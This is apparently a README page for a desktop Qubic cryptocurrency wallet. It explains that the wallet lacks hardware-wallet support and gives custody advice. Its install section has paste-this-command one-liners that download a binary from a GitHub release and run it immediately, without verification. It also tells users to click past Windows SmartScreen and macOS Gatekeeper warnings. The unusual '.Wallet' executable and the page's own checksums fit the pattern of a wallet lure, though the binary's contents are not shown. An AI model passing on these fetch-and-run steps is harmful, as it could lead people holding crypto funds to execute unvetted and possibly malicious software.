![Hardware wallets and Qubic Wallet](assets/banner-trust.png)

# Using Qubic Wallet With Ledger, Tangem or HASHWallet

No device integration exists. That is an answer, not a workaround.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

The absence described here is from the dependency list and tree of the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2).

> A hardware wallet signs with a key you never see. This app has no way to ask one.

Qubic Wallet does not support Ledger, Tangem or HASHWallet. There is no device connection in the source: the server dependencies are web-facing libraries, with no USB, HID or transport library among them, and nothing in the tree references a hardware signing path. A device can hold no Qubic key for this wallet, and no screen in the app offers to pair one.

<!-- ARTICLE-BODY-BEGIN -->

## What each device would need

| Device | What support would require | Status in this build |
| --- | --- | --- |
| Ledger | A Qubic app on the device plus a transport in the wallet | Neither exists |
| Tangem | A card applet for Qubic and a card transport | Neither exists |
| HASHWallet | Vendor signing support and a wallet-side bridge | Neither exists |

The pattern is the same for all three: the device needs to know how to sign Qubic transactions, and the wallet needs a way to talk to it. This build has neither half.

## Why it is not a settings problem

There is no toggle to find and no driver to install, because the capability is not present. Anyone offering a "Qubic hardware integration" for this wallet is describing something that does not exist, and an installer that claims it is a reason to stop.

## The custody consequence

Without a device, the private key exists on your machine whenever the account is unlocked. That is the same trade every software wallet makes, and it is why the encrypted file and the password matter as much as they do. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-cold-storage-custody.md">custody comparison</a> sets out where that leaves you against an exchange or an offline machine.

## What to do instead

Use a machine that never goes online for a large holding, keep the phrase on paper and the password separate, and treat the wallet file as a copy of an encrypted secret rather than a backup. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md">seed format guide</a> covers what a valid phrase looks like for the two formats this app generates.

Install only from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>, since a third-party repack advertising device support has no release page to check against.

## FAQ

### Can I connect a Ledger to Qubic Wallet?

No. No device transport exists in the build.

### Does Tangem support Qubic?

Nothing in this project supports Tangem, and no card applet is shipped with it.

### Will hardware support arrive?

Not in this release. No roadmap date is published.

### Is my key less safe without a hardware wallet?

The key is encrypted at rest and scrubbed from memory, which is the software model. A device would remove a class of risk this build cannot.

### Can I store my seed on a hardware wallet instead?

You can keep a written seed in a safe place. That is not the same as hardware signing, and this app cannot use a device to sign.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Cold storage and custody](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-cold-storage-custody.md)
- [Seed phrase formats](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
